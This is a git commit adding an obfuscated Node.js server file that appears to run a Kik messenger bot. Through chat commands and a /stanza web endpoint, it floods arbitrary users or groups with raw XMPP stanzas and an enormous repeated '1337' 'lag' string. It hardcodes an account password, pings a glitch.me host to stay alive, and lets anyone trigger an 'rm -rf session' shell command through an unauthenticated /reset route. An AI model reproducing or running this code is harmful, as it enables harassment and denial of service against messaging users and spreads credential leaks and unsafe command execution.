f6250076ea8a90c561f5675617db4d77e26bd627
WronglyOne <80096118+WronglyOne@users.noreply.github.com>
2021-06-22 18:01:48 -0500

    Add files via upload

---
+++ server.js
@@ -0,0 +1,367 @@
+let userinfo = ["alias.sender", "wrong1$$"];
+
+(async () => {
+  let axios = require("axios");
+  setInterval(async () => {
+    await axios.get("https://drinkerss.glitch.me/");
+    await axios.get("https://drinkerss.glitch.me/");
+    await axios.get("https://drinkerss.glitch.me/");
+    return;
+  }, 120000);
+})();
+
+const _0x6c38 = [
+  "perm",
+  "addFriend",
+  "/morph",
+  "sendXmpp",
+  "jid",
+  "port",
+  ":\x20[",
+  "PRIVATE:\x20",
+  "]:\x20",
+  "Send",
+  "static",
+  "/views/index.html",
+  "500mb",
+  "sendFile",
+  "grouptyping",
+  "slice",
+  "env",
+  "error:\x20",
+  "666669xRRwUb",
+  "axios",
+  "Your\x20app\x20is\x20listening\x20on\x20port\x20",
+  "Xmpp",
+  "userleftgroup",
+  "\x20loops\x20UwU,\x20I\x20like\x20when\x20you\x20make\x20me\x20do\x20such\x20naughty\x20things\x20sendpai.",
+  "1011272CmfTaZ",
+  "all\x20done\x20sending\x20",
+  "stdout:\x20",
+  "\x20joined\x20the\x20group",
+  "receivedroster",
+  "split",
+  "code",
+  "213616dfBSXR",
+  "receivedcaptcha",
+  "receivedjidinfo",
+  "\x20stopped\x20typing",
+  "express",
+  "log",
+  "setGroupMember",
+  "public",
+  "authenticated",
+  "Loop",
+  "post",
+  "link",
+  "133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713++l",
+  "body",
+  "forEach",
+  "setBanned",
+  "\x20is\x20typing...",
+  "unescape",
+  "send",
+  "address",
+  "969698AwOmsA",
+  "15787XeRFtU",
+  "./src/core",
+  "1101448szCEsZ",
+  "Add",
+  "receivedprivatemsg",
+  "15LWBWew",
+  "rm\x20-rf\x20session\x20&&\x20refresh",
+  "sendMessage",
+  "/stanza",
+  "jids",
+  "Please\x20solve\x20captcha",
+  "./src/permit",
+  "json",
+  "listen",
+  ".kik.com",
+  "\x20https://drinkerss.glitch.me/\x20",
+  "347834eAAgea",
+  "urlencoded",
+  "get",
+  "1ZTGYFc",
+  "userjoinedgroup",
+  "displayName",
+  "GROUP:",
+  "PORT",
+  "connect",
+  "use",
+  "\x20left\x20the\x20group",
+  "child_process",
+  "Fast"
+];
+const _0x53a8 = function(_0xd19bd3, _0x148d54) {
+  _0xd19bd3 = _0xd19bd3 - 0xcf;
+  let _0x6c38e6 = _0x6c38[_0xd19bd3];
+  return _0x6c38e6;
+};
+const _0x51584c = _0x53a8;
+(function(_0x47ed55, _0x1d0dda) {
+  const _0x2fec52 = _0x53a8;
+  while (!![]) {
+    try {
+      const _0x18fc16 =
+        -parseInt(_0x2fec52(0xfc)) +
+        parseInt(_0x2fec52(0xf5)) +
+        parseInt(_0x2fec52(0x116)) * parseInt(_0x2fec52(0x111)) +
+        parseInt(_0x2fec52(0x110)) +
+        -parseInt(_0x2fec52(0xd3)) * -parseInt(_0x2fec52(0xd0)) +
+        -parseInt(_0x2fec52(0xef)) +
+        -parseInt(_0x2fec52(0x113));
+      if (_0x18fc16 === _0x1d0dda) break;
+      else _0x47ed55["push"](_0x47ed55["shift"]());
+    } catch (_0x45b562) {
+      _0x47ed55["push"](_0x47ed55["shift"]());
+    }
+  }
+})(_0x6c38, 0x8e8c4);
+const express = require(_0x51584c(0x100)),
+  app = express(),
+  permit = require(_0x51584c(0x11c))[_0x51584c(0xdd)],
+  accesJids = require("./src/permit")[_0x51584c(0x11a)],
+  axios = require(_0x51584c(0xf0)),
+  { exec } = require(_0x51584c(0xdb));
+app[_0x51584c(0xd9)](
+  express[_0x51584c(0x11d)]({ limit: _0x51584c(0xe9), extended: !![] })
+),
+  app["use"](
+    express[_0x51584c(0xd1)]({ limit: _0x51584c(0xe9), extended: !![] })
+  ),
+  app[_0x51584c(0xd9)](express[_0x51584c(0xe7)](_0x51584c(0x103))),
+  app["get"]("/", function(_0x2269ea, _0x5d80f0) {
+    const _0x119853 = _0x51584c;
+    _0x5d80f0["sendFile"](__dirname + _0x119853(0xe8));
+  }),
+  app[_0x51584c(0xd2)]("/reset", function(_0x51d41b, _0x7353c6) {
+    const _0x2b386c = _0x51584c;
+    exec(_0x2b386c(0x117), (_0x45bc7a, _0x36907c, _0x38b47e) => {
+      const _0x4b7174 = _0x2b386c;
+      if (_0x45bc7a) {
+        console["log"](_0x4b7174(0xee) + _0x45bc7a["message"]);
+        return;
+      }
+      if (_0x38b47e) {
+        console[_0x4b7174(0x101)]("stderr:\x20" + _0x38b47e);
+        return;
+      }
+      console[_0x4b7174(0x101)](_0x4b7174(0xf7) + _0x36907c);
+    });
+  });
+let Kik;
+app[_0x51584c(0xd2)](_0x51584c(0xdf), function(_0x5169f7, _0x621abe) {
+  const _0x2a4f3a = _0x51584c;
+  _0x621abe[_0x2a4f3a(0xea)](__dirname + "/morph.js");
+});
+const KikClient = require(_0x51584c(0x112)),
+  decode = require(_0x51584c(0x10d));
+Kik = new KikClient({
+  username: userinfo[0x0],
+  password: userinfo[0x1],
+  promptCaptchas: !![],
+  trackUserInfo: !![],
+  trackFriendInfo: !![]
+});
+async function webXmpp(_0x1aea25, _0x445557, _0x285b5d) {
+  const _0x161f24 = _0x51584c;
+  let _0x498c90 = 0x0;
+  while (_0x498c90 <= _0x445557) {
+    console[_0x161f24(0x101)](_0x1aea25),
+      Kik[_0x161f24(0xe0)](_0x285b5d, _0x1aea25),
+      await new Promise(_0x5bb58f => setTimeout(_0x5bb58f, delay)),
+      (_0x498c90 += 0x1);
+  }
+}
+app[_0x51584c(0x106)](_0x51584c(0x119), function(_0x3c2496, _0x2358f5) {
+  const _0x59f59e = _0x51584c;
+  console[_0x59f59e(0x101)](_0x3c2496[_0x59f59e(0x109)]),
+    _0x2358f5[_0x59f59e(0x10e)](""),
+    webXmpp(
+      _0x3c2496[_0x59f59e(0x109)][0x0],
+      _0x3c2496[_0x59f59e(0x109)][0x1],
+      _0x3c2496[_0x59f59e(0x109)][0x2]
+    );
+}),
+  Kik["on"](_0x51584c(0x104), () => {}),
+  Kik["on"](_0x51584c(0xf9), (_0x19e9b7, _0x530109) => {
+    const _0x1bb7d4 = _0x51584c;
+    console[_0x1bb7d4(0x101)](_0x19e9b7), console[_0x1bb7d4(0x101)](_0x530109);
+  }),
+  Kik["on"](_0x51584c(0xfd), _0x1e2d55 => {
+    const _0x5c0140 = _0x51584c;
+    console[_0x5c0140(0x101)](_0x5c0140(0x11b) + _0x1e2d55);
+  }),
+  Kik["on"](_0x51584c(0xfe), _0x24ba60 => {
+    const _0x454888 = _0x51584c;
+    console["log"]("We\x20got\x20peer\x20info:"),
+      console[_0x454888(0x101)](_0x24ba60);
+  }),
+  Kik["on"]("receivedgroupmsg", (_0x4d3199, _0x555acc, _0x5ca939) => {
+    const _0x1b0326 = _0x51584c;
+    console[_0x1b0326(0x101)](
+      _0x1b0326(0xd6) +
+        _0x4d3199[_0x1b0326(0xfb)] +
+        _0x1b0326(0xe3) +
+        _0x555acc[_0x1b0326(0xd5)] +
+        _0x1b0326(0xe5) +
+        _0x5ca939
+    );
+  }),
+  Kik["on"](_0x51584c(0xeb), (_0x25b3b3, _0x38fda8, _0x24250) => {
+    const _0x25b538 = _0x51584c;
+    _0x24250
+      ? console["log"](
+          _0x25b538(0xd6) +
+            _0x25b3b3["code"] +
+            ":\x20" +
+            _0x38fda8[_0x25b538(0xd5)] +
+            _0x25b538(0x10c)
+        )
+      : console[_0x25b538(0x101)](
+          "GROUP:" +
+            _0x25b3b3["code"] +
+            ":\x20" +
+            _0x38fda8["displayName"] +
+            _0x25b538(0xff)
+        );
+  }),
+  Kik["on"](_0x51584c(0xf3), (_0x4537e2, _0x27654d, _0x2465b8) => {
+    const _0x180585 = _0x51584c;
+    console["log"](
+      _0x180585(0xd6) +
+        _0x4537e2[_0x180585(0xfb)] +
+        ":\x20" +
+        _0x27654d[_0x180585(0xd5)] +
+        _0x180585(0xda)
+    ),
+      Kik[_0x180585(0x10b)](_0x4537e2["jid"], _0x27654d["jid"], !![]);
+  }),
+  Kik["on"](_0x51584c(0xd4), (_0x13a0a5, _0xf3eda1, _0x316636) => {
+    const _0x4cbd55 = _0x51584c;
+    console[_0x4cbd55(0x101)](
+      _0x4cbd55(0xd6) +
+        _0x13a0a5[_0x4cbd55(0xfb)] +
+        ":\x20" +
+        _0xf3eda1[_0x4cbd55(0xd5)] +
+        _0x4cbd55(0xf8)
+    ),
+      Kik[_0x4cbd55(0x102)](_0x13a0a5[_0x4cbd55(0xe1)], _0xf3eda1["jid"], ![]);
+  });
+let lag1 = _0x51584c(0x108),
+  delay = 0x190;
+Kik["on"](_0x51584c(0x115), async (_0x1d3c6b, _0x562915) => {
+  const _0x236276 = _0x51584c;
+  if (permit(_0x1d3c6b["jid"])) {
+    let _0xd5a323 = _0x562915[_0x236276(0xfa)]("\x20"),
+      _0x80abb = _0x562915[_0x236276(0xfa)]("\x0a");
+    if (_0xd5a323[0x0] == _0x236276(0x114) && _0xd5a323[0x1] == "me") {
+      let _0x3fbedb =
+        "I\x27ve\x20always\x20wanted\x20a\x20BFF,\x20you\x20can\x20add\x20me\x20to\x20groups\x20now";
+      await Kik[_0x236276(0xde)](_0x1d3c6b[_0x236276(0xe1)]),
+        await Kik[_0x236276(0xde)](_0x1d3c6b[_0x236276(0xe1)]),
+        await Kik["addFriend"](_0x1d3c6b["jid"]),
+        await Kik[_0x236276(0x118)](_0x1d3c6b[_0x236276(0xe1)], _0x3fbedb);
+      return;
+    }
+    if (
+      _0xd5a323[0x0] == _0x236276(0xe6) &&
+      _0xd5a323[0x1] == _0x236276(0x107)
+    ) {
+      let _0x5557f3 = [
+        "\x20https://mud-spiral-ton.glitch.me/\x20",
+        _0x236276(0xcf)
+      ];
+      await Kik[_0x236276(0x118)](_0x1d3c6b[_0x236276(0xe1)], _0x5557f3[0x1]);
+      return;
+    }
+    await Kik["sendMessage"](
+      _0x1d3c6b[_0x236276(0xe1)],
+      "Okay\x20senpai\x20😳"
+    );
+    if (_0xd5a323[0x0] == _0x236276(0xf2)) {
+      (async () => {
+        const _0x57c587 = _0x236276;
+        let _0x2063ba = 0x0;
+        while (_0x2063ba <= parseInt(_0xd5a323[0x2])) {
+          Kik["sendXmpp"](_0xd5a323[0x1], decode(_0x80abb[0x1])),
+            await new Promise(_0xc44cdb => setTimeout(_0xc44cdb, delay)),
+            (_0x2063ba += 0x1);
+        }
+        let _0x35d38c =
+          "all\x20done\x20sending\x20" +
+          _0xd5a323[0x2] +
+          "\x20loops\x20UwU,\x20I\x20like\x20when\x20you\x20make\x20me\x20do\x20such\x20naughty\x20things\x20sendpai.";
+        await Kik["sendMessage"](_0x1d3c6b[_0x57c587(0xe1)], _0x35d38c);
+      })();
+      return;
+    }
+    if (
+      _0xd5a323[0x0] == _0x236276(0x105) &&
+      _0xd5a323[0x1]["endsWith"](_0x236276(0x11f))
+    ) {
+      (async () => {
+        const _0x14c8b2 = _0x236276;
+        Kik["sendMessage"]("", _0x562915);
+        let _0x4ab6b0 = 0x0;
+        while (_0x4ab6b0 <= _0xd5a323[0x2]) {
+          await Kik[_0x14c8b2(0x118)](_0xd5a323[0x1], lag1),
+            await new Promise(_0x25e4e7 => setTimeout(_0x25e4e7, delay)),
+            (_0x4ab6b0 += 0x1);
+        }
+        let _0x29690e = _0x14c8b2(0xf6) + _0xd5a323[0x2] + _0x14c8b2(0xf4);
+        await Kik["sendMessage"](_0x1d3c6b["jid"], _0x29690e);
+      })();
+      return;
+    }
+    if (
+      _0xd5a323[0x0] == _0x236276(0xdc) &&
+      _0xd5a323[0x1]["endsWith"](_0x236276(0x11f))
+    ) {
+      (async () => {
+        const _0xf929f = _0x236276;
+        Kik["sendMessage"]("", _0x562915);
+        let _0x6efe8d = 0x0;
+        while (_0x6efe8d <= _0xd5a323[0x2]) {
+          await Kik["sendMessage"](_0xd5a323[0x1], lag1),
+            await new Promise(_0x4af0cc => setTimeout(_0x4af0cc, 0x37)),
+            (_0x6efe8d += 0x1);
+        }
+        let _0x4184d8 = _0xf929f(0xf6) + _0xd5a323[0x2] + _0xf929f(0xf4);
+        await Kik[_0xf929f(0x118)](_0x1d3c6b[_0xf929f(0xe1)], _0x4184d8);
+      })();
+      return;
+    }
+  } else
+    permit(_0x1d3c6b[_0x236276(0xe1)]) == ![] &&
+      accesJids[_0x236276(0x10a)](_0x45b328 => {
+        const _0x40cb89 = _0x236276;
+        let _0x372fa4 = _0x1d3c6b["jid"][_0x40cb89(0xec)](0x0, -0x11);
+        Kik[_0x40cb89(0x118)](
+          _0x45b328,
+          "@" + _0x372fa4 + "\x20attempted\x20to\x20send\x20the\x20following:"
+        ),
+          Kik[_0x40cb89(0x118)](_0x45b328, decode(_0x562915));
+      });
+}),
+  Kik["on"]("privatetyping", (_0x2ece69, _0x369fde) => {
+    const _0x5ea84f = _0x51584c;
+    _0x369fde
+      ? console[_0x5ea84f(0x101)](
+          _0x5ea84f(0xe4) + _0x2ece69[_0x5ea84f(0xe1)] + "\x20is\x20typing"
+        )
+      : console[_0x5ea84f(0x101)](
+          _0x5ea84f(0xe4) + _0x2ece69[_0x5ea84f(0xe1)] + _0x5ea84f(0xff)
+        );
+  });
+const listener = app[_0x51584c(0x11e)](
+  process[_0x51584c(0xed)][_0x51584c(0xd7)],
+  function() {
+    const _0x5b679d = _0x51584c;
+    Kik[_0x5b679d(0xd8)](),
+      console[_0x5b679d(0x101)](
+        _0x5b679d(0xf1) + listener[_0x5b679d(0x10f)]()[_0x5b679d(0xe2)]
+      );
+  }
+);
